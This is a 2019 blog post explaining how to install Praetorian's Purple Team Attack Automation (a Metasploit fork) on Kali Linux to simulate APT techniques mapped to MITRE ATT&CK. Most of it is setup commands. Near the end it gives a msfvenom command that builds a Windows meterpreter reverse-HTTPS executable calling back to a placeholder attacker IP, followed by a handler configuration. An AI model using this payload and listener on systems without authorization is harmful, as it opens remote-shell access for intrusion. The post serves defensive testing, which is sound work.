<!DOCTYPE html>
<html lang="en" prefix="og: http://ogp.me/ns#" class="bg-dark">
  <head>

<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="theme-color" content="#ffffff" />


<meta property="title" content="Simulating APTs For Fun - SerializingMe" />


  
<meta name="description" content="How to simulate Advanced Persistent Threats (APT) using Metasploit and MITRE&#39;s ATT&amp;CK framework..." />
  
  
    
    
<meta name="keywords" content="Red Team,Metasploit,ATT&amp;CK" />
    
  


<meta name="author" content="Duarte Silva" />



<meta itemprop="title" content="Simulating APTs For Fun - SerializingMe" />


  
<meta itemprop="description" content="How to simulate Advanced Persistent Threats (APT) using Metasploit and MITRE&#39;s ATT&amp;CK framework..." />
  
  
<meta itemprop="image" content="https://www.serializing.me/uploads/2019/04/msfconsole.png" />
  
  
    
    
<meta itemprop="keywords" content="Red Team,Metasploit,ATT&amp;CK" />
    
  
  
<meta itemprop="wordCount" content="1207" />
  



<meta property="og:title" content="Simulating APTs For Fun - SerializingMe" />


  
<meta property="og:type" content="article" />
  
  
<meta property="og:description" content="How to simulate Advanced Persistent Threats (APT) using Metasploit and MITRE&#39;s ATT&amp;CK framework..." />
  
  
<meta property="og:image" content="https://www.serializing.me/uploads/2019/04/msfconsole.png" />
  


<meta property="og:url" content="https://www.serializing.me/2019/04/29/simulating-apts-for-fun/" />


<meta property="og:site_name" content="SerializingMe" />



  
<meta name="twitter:card" content="summary_large_image" />
  



<meta name="twitter:title" content="Simulating APTs For Fun - SerializingMe" />


<meta name="twitter:url" content="https://www.serializing.me/2019/04/29/simulating-apts-for-fun/" />


  
<meta name="twitter:description" content="How to simulate Advanced Persistent Threats (APT) using Metasploit and MITRE&#39;s ATT&amp;CK framework..." />
  
  
<meta name="twitter:image" content="https://www.serializing.me/uploads/2019/04/msfconsole.png" />
  


<title>Simulating APTs For Fun - SerializingMe</title>
<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<link rel="manifest" href="https://www.serializing.me/manifest.json">
<link rel="mask-icon" href="https://www.serializing.me/safari-pinned-tab.svg" color="#5bbad5">

<link href="https://www.serializing.me/index.xml" rel="alternate" type="application/rss+xml" title="SerializingMe Combined Feed" />
<link href="https://www.serializing.me/page/index.xml" rel="alternate" type="application/rss+xml" title="SerializingMe Pages Feed" />
<link href="https://www.serializing.me/post/index.xml" rel="alternate" type="application/rss+xml" title="SerializingMe Posts Feed" />
<link href="https://www.serializing.me/project/index.xml" rel="alternate" type="application/rss+xml" title="SerializingMe Projects Feed" />

<link href="https://www.serializing.me/css/bootstrap-reboot.min.css" rel="stylesheet" />
<link href="https://www.serializing.me/css/bootstrap.min.css" rel="stylesheet" /><link href="https://www.serializing.me/css/serializingme.min.css" rel="stylesheet" />

  </head>
  <body>
    <header>
<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
  <div class="container">
    <a class="navbar-brand" href="https://www.serializing.me/">
      <img src="/brand.png" width="30" height="30" class="d-inline-block align-top" /> SerializingMe
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarCollapse">
      <ul class="navbar-nav ml-auto">


        <li class="nav-item "><a class="nav-link" title="Blog" href="https://www.serializing.me/post/">Blog</a></li>

        <li class="nav-item "><a class="nav-link" title="Projects" href="https://www.serializing.me/project/">Projects</a></li>

        <li class="nav-item "><a class="nav-link" title="Contributions" href="https://www.serializing.me/contributions/">Contributions</a></li>

        <li class="nav-item "><a class="nav-link" title="About" href="https://www.serializing.me/about/">About</a></li>

      </ul>
    </div>
  </div>
</nav>
<noscript>
  <div class="container mt-2 mb-0">
    <div class="alert alert-danger">JavaScript is disabled, this site will not work properly without it.</div>
  </div>
</noscript>

    </header>
    <section class="container">


  <div class="row">
  
  <div class="col-lg-8">
    
    <div class="card mb-4 my-4"><img class="card-img-top" src="/uploads/2019/04/msfconsole.png" alt="Simulating APTs For Fun" /><div class="card-body">
        <h2 class="card-title">
Simulating APTs For Fun
        </h2>
        <div>
<p>In the post I will explain how one could simulate an Advanced Persistent Threat (APT) using Praetorian&rsquo;s Purple Team Attack Automation and MITRE&rsquo;s ATT&amp;CK framework.</p>
<div class="ratio ratio-16x9 mb-3">
  <iframe src="https://www.youtube.com/embed/REMVMfoeJWE" allowfullscreen title="YouTube Video"></iframe>
</div>

<h3 id="introduction">Introduction</h3>
<p>How does one go about validating that what has been setup to protect one&rsquo;s infrastructure is actually useful? Well, one will need to be able to simulate threats. To do that, one needs two things, an environment and tools. In the past few days I have been investigating tools that would allow me to simulate Tactics, Techniques and Procedures (TTPs) of better known APTs to validate some concepts we have been exploring at work.</p>
<p>An obvious choice was MITRE&rsquo;s CALDERA, ended up disappointed with it, but pleasantly surprised by Praetorian&rsquo;s <a href="https://github.com/praetorian-code/purple-team-attack-automation/" title="Purple Team Attack Automation Repository">Purple Team Attack Automation</a> (shoutout to <a href="https://twitter.com/decalage2" title="Decalage Twitter">@Decalage2</a> for pointing me to it). As per Purple Team Attack Automation (PTAA) documentation, one should make use of Docker to install it, something that I&rsquo;m not very keen on doing.</p>
<p>I decided to manually install it, in a nutshell, PTAA is Metasploit with extra modules added to it so how hard could it be? That&rsquo;s also the reason why I liked PTAA so much: the fact that it leverages existing and well maintained software that I use on my workflow.</p>
<div class="alert alert-info"><span><i class="fas fa-info-circle"></i>&nbsp;</span>Note that the installation of PTAA was performed in a fresh and fully updated Kali Linux 2019.1a.</div>
<h3 id="first-things-first">First Things First</h3>
<p>First thing is to install the dependencies needed to build the Ruby gems required by Metasploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span>apt-get install -y libssl-dev libreadline-dev zlib1g-dev libpq-dev libsqlite3-dev libpcap-dev
</code></pre></div><p>Then, clone the source code of <a href="https://github.com/rbenv" title="rbenv Repository">rbenv</a>, <a href="https://github.com/rbenv/ruby-build" title="ruby-build Respository">ruby-build</a> and of PTAA itself. We&rsquo;ll make use of rbenv as the Metasploit version from which PTAA is based upon, has different requirements from the Metasploit that comes with Kali (e.g., Ruby version). Creating a separate environment makes things easier to manage and avoids problems with version conflicts and the likes.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>git clone https://github.com/praetorian-code/purple-team-attack-automation.git ~/purple-team-attack-automation
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Cloning into &#39;/home/researcher/purple-team-attack-automation&#39;...</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># remote: Enumerating objects: 480023, done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># remote: Counting objects: 100% (480023/480023), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># remote: Compressing objects: 100% (115968/115968), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># remote: Total 480023 (delta 351889), reused 479916 (delta 351795), pack-reused 0</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic"># Receiving objects: 100% (480023/480023), 385.07 MiB | 6.04 MiB/s, done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#999;font-style:italic"># Resolving deltas: 100% (351889/351889), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># Checking out files: 100% (10339/10339), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>git clone https://github.com/rbenv/rbenv.git ~/.rbenv
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># Cloning into &#39;/home/researcher/.rbenv&#39;...</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic"># remote: Enumerating objects: 15, done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># remote: Counting objects: 100% (15/15), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># remote: Compressing objects: 100% (13/13), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#999;font-style:italic"># remote: Total 2759 (delta 4), reused 6 (delta 2), pack-reused 2744</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#999;font-style:italic"># Receiving objects: 100% (2759/2759), 528.92 KiB | 1.37 MiB/s, done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#999;font-style:italic"># Resolving deltas: 100% (1724/1724), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span><span style="color:#999;font-style:italic"># Cloning into &#39;/home/researcher/.rbenv/plugins/ruby-build&#39;...</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span><span style="color:#999;font-style:italic"># remote: Enumerating objects: 30, done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span><span style="color:#999;font-style:italic"># remote: Counting objects: 100% (30/30), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span><span style="color:#999;font-style:italic"># remote: Compressing objects: 100% (19/19), done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span><span style="color:#999;font-style:italic"># remote: Total 9742 (delta 10), reused 24 (delta 7), pack-reused 9712</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span><span style="color:#999;font-style:italic"># Receiving objects: 100% (9742/9742), 2.08 MiB | 3.27 MiB/s, done.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span><span style="color:#999;font-style:italic"># Resolving deltas: 100% (6336/6336), done.</span>
</code></pre></div><h3 id="ruby-ruby-gems-and-a-database">Ruby, Ruby Gems and a Database</h3>
<p>After the code has been downloaded, we need to create a file that can be used to setup the environment every time we want to make use of PTAA. The rbenv documentation instructs one to use the <code>.bashrc</code> file. This works well when you have a dedicated user to run the software you&rsquo;re installing, which is not the case. As such, I prefer to use a specific file that I use only when needed.</p>
<div class="alert alert-warning"><span><i class="fas fa-exclamation-triangle"></i>&nbsp;</span>Note that the environment file adds <code>/usr/lib/postgresql/11/bin</code> to the <code>PATH</code> variable as Metasploit <code>msfdb</code> utility makes use of <code>pg_ctl</code>.</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;#!/bin/bash&#39;</span> &gt; ~/purple-team-attack-automation/.envinit
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;export PATH=&#34;$HOME/.rbenv/bin:$PATH&#34;&#39;</span> &gt;&gt; ~/purple-team-attack-automation/.envinit
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;export PATH=&#34;$HOME/purple-team-attack-automation/:$PATH&#34;&#39;</span> &gt;&gt; ~/purple-team-attack-automation/.envinit
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;export PATH=&#34;$PATH:/usr/lib/postgresql/11/bin&#34;&#39;</span> &gt;&gt; ~/purple-team-attack-automation/.envinit
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">6</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;export PS1=&#34;(purple-team-attack-automation) $PS1&#34;&#39;</span> &gt;&gt; ~/purple-team-attack-automation/.envinit
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">7</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;eval &#34;$(rbenv init -)&#34;&#39;</span> &gt;&gt; ~/purple-team-attack-automation/.envinit
</code></pre></div><p>Now we have everything ready to install Ruby and the gems needed by Metasploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span>. ~/purple-team-attack-automation/.envinit
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#24909d">cd</span> ~/purple-team-attack-automation
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span>rbenv install
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">6</span><span style="color:#999;font-style:italic"># Downloading ruby-2.6.2.tar.bz2...</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">7</span><span style="color:#999;font-style:italic"># -&gt; https://cache.ruby-lang.org/pub/ruby/2.6/ruby-2.6.2.tar.bz2</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">8</span><span style="color:#999;font-style:italic"># Installing ruby-2.6.2...</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">9</span><span style="color:#999;font-style:italic"># Installed ruby-2.6.2 to /home/researcher/.rbenv/versions/2.6.2</span>
</code></pre></div><p>Verify that the environment is properly setup and correct any errors reported.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span>curl -fsSL https://github.com/rbenv/rbenv-installer/raw/master/bin/rbenv-doctor | bash
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#999;font-style:italic"># Checking for `rbenv&#39; in PATH: /home/researcher/.rbenv/bin/rbenv</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span><span style="color:#999;font-style:italic"># Checking for rbenv shims in PATH: OK</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span><span style="color:#999;font-style:italic"># Checking `rbenv install&#39; support: /home/researcher/.rbenv/plugins/ruby-build/bin/rbenv-install (ruby-build 20190423)</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">6</span><span style="color:#999;font-style:italic"># Counting installed Ruby versions: 1 versions</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">7</span><span style="color:#999;font-style:italic"># Checking RubyGems settings: OK</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">8</span><span style="color:#999;font-style:italic"># Auditing installed plugins: OK</span>
</code></pre></div><p>Finally install the Ruby gems needed by Metasploit using <a href="https://bundler.io/" title="Ruby Bundler Site">bundler</a> and setup the database.</p>
<div class="alert alert-danger"><span><i class="fas fa-minus-circle"></i>&nbsp;</span>You&rsquo;ll probably want to skip the database initialization command if you already make use of Metasploit&rsquo;s database since you may end up deleting all the loot you have acquired and stored in the already existing database.</div>
<div class="alert alert-info"><span><i class="fas fa-info-circle"></i>&nbsp;</span>Make sure the user you are using to execute the <code>msfdb</code> utility is in the <code>postgres</code> group, otherwise it will fail.</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>gem install bundler
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Fetching bundler-2.0.1.gem</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># Successfully installed bundler-2.0.1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># Parsing documentation for bundler-2.0.1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># Installing ri documentation for bundler-2.0.1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># Done installing documentation for bundler after 2 seconds</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic"># 1 gem installed</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>bundler install
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#999;font-style:italic"># Warning: the running version of Bundler (1.17.2) is older than the version that created the lockfile (1.17.3). We suggest you upgrade to the latest version of Bundler by running `gem install bundler`.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#999;font-style:italic"># Fetching gem metadata from https://rubygems.org/..............</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># Using rake 12.3.2</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic"># Fetching Ascii85 1.0.3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># Installing Ascii85 1.0.3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># Fetching concurrent-ruby 1.0.5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#999;font-style:italic"># Installing concurrent-ruby 1.0.5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#999;font-style:italic"># Fetching i18n 0.9.5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#999;font-style:italic"># Installing i18n 0.9.5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#999;font-style:italic"># Using minitest 5.11.3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span><span style="color:#999;font-style:italic"># ...</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>id
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span><span style="color:#999;font-style:italic"># uid=1000(researcher) gid=1000(researcher) groups=1000(researcher),27(sudo),117(postgres)</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>msfdb init --component database
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span><span style="color:#999;font-style:italic"># Creating database at /home/researcher/.msf4/db</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span><span style="color:#999;font-style:italic"># Starting database at /home/researcher/.msf4/db...success</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span><span style="color:#999;font-style:italic"># Creating database users</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span><span style="color:#999;font-style:italic"># Writing client authentication configuration file /home/researcher/.msf4/db/pg_hba.conf</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span><span style="color:#999;font-style:italic"># Stopping database at /home/researcher/.msf4/db</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span><span style="color:#999;font-style:italic"># Starting database at /home/researcher/.msf4/db...success</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span><span style="color:#999;font-style:italic"># Creating initial database schema</span>
</code></pre></div><h3 id="first-run">First Run</h3>
<p>Now that the environment and PTAA are ready, the next step is to generate the payload that will be used to &ldquo;infect&rdquo; a target machine.</p>
<div class="alert alert-warning"><span><i class="fas fa-exclamation-triangle"></i>&nbsp;</span>Note that the payload generation options below are just for testing. You won&rsquo;t be fooling anyone ;)</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span>msfvenom -p windows/x64/meterpreter_reverse_https -a x64 --platform windows <span style="color:#40ffff">LHOST</span>=&lt;attacker IP address&gt; <span style="color:#40ffff">LPORT</span>=<span style="color:#3677a9">8443</span> -f exe &gt; meterpreter.exe
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#999;font-style:italic"># No encoder or badchars specified, outputting raw payload</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span><span style="color:#999;font-style:italic"># Payload size: 207449 bytes</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span><span style="color:#999;font-style:italic"># Final size of exe file: 214016 bytes</span>
</code></pre></div><p>Then we can run Metasploit and start a handler to receive the connections from our Meterpreter payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>. ~/purple-team-attack-automation/.activate
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>msfdb start --component database
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>msfconsole
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>msf5 &gt; use exploit/multi/handler
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>msf5 exploit(multi/handler) &gt; <span style="color:#24909d">set</span> PAYLOAD windows/meterpreter/reverse_https
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>msf5 exploit(multi/handler) &gt; <span style="color:#24909d">set</span> LHOST &lt;attacker IP ahaddress&gt;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># LHOST =&gt; &lt;attacker IP address&gt;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>msf5 exploit(multi/handler) &gt; <span style="color:#24909d">set</span> LPORT <span style="color:#3677a9">8443</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># LPORT =&gt; 8443</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>msf5 exploit(multi/handler)&gt; exploit -j -z
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#999;font-style:italic"># [*] Exploit running as background job 0.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#999;font-style:italic"># [*] Exploit completed, but no session was created.</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span><span style="color:#999;font-style:italic"># [*] Started reverse TCP handler on 192.168.23.205:8443</span>
</code></pre></div><h3 id="running-the-simulation">Running the Simulation</h3>
<p>Now that we have everything ready, we need to select what PTAA modules we need to run. Since PTAA makes usage of MITRE&rsquo;s ATT&amp;CK framework we can for each of the defined tactics, select the techniques specific to the APT one wants to simulate and that PTAA supports. For example, if we want to simulate APT28 (because, from Mother Russia with love) on the &ldquo;Execution&rdquo; tactic we can select technique T1086 - execution with PowerShell.</p>
<p>Hope this is helpful :D</p></div>
      </div>
      <div class="card-footer">
<span><i class="fas fa-calendar-alt"></i>&nbsp;</span>April 29, 2019&nbsp;&nbsp;<br/>
<span><i class="fas fa-folder-open"></i>&nbsp;</span><a href="https://www.serializing.me/categories/linux/">Linux</a>,&nbsp;<a href="https://www.serializing.me/categories/configuration/">Configuration</a>&nbsp;&nbsp;<br/>
<span><i class="fas fa-tag"></i>&nbsp;</span><a href="https://www.serializing.me/tags/red-team/">Red Team</a>,&nbsp;<a href="https://www.serializing.me/tags/metasploit/">Metasploit</a>,&nbsp;<a href="https://www.serializing.me/tags/attck/">ATT&amp;CK</a>
      </div>
    </div>
    <ul class="pagination justify-content-center mb-4"><li class="page-item">
        <a href="https://www.serializing.me/2020/03/29/bypass-all-the-gpos/" title="Bypass All The GPOs" class="page-link"><span><i class="fas fa-chevron-left"></i>&nbsp;</span>Newer</a>
      </li><li class="page-item">
